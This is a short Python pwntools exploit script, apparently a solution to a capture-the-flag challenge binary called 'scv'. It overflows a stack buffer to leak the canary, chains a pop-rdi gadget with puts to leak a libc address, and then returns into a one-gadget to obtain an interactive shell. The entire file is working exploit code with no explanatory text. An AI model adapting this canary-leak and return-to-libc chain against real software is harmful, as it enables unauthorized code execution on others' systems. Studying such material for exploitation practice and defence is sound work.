from pwn import *

p = process('./scv')
e = ELF('./scv')
l = e.libc

prdi = 0x0000000000400ea3
main = 0x0000000000400A96
oneshot = 0x45216
p.sendlineafter('>>', '1')
p.sendafter('>>', 'A'*(0xb0-7))
p.sendlineafter('>', '2')

p.recvuntil('A'*(0xb0-7))
canary = '\x00' + p.recv(7)

print hex(u64(canary))

payload = 'A'*(0xb0-8)
payload += canary
payload += 'A'*8
payload += p64(prdi)
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(main)

p.sendlineafter('>>', '1')
p.sendafter('>>', payload)
p.sendlineafter('>>', '3')
base = u64(p.recvuntil('\x7f')[-6:]+'\x00\x00')
base -= l.symbols['puts']
print hex(base)


payload = 'A'*(0xb0-8)
payload += canary
payload += 'A'*8
payload += p64(base+oneshot)
p.sendlineafter('>>', '1')
p.send(payload)
p.sendlineafter('>>', '3')


p.interactive()
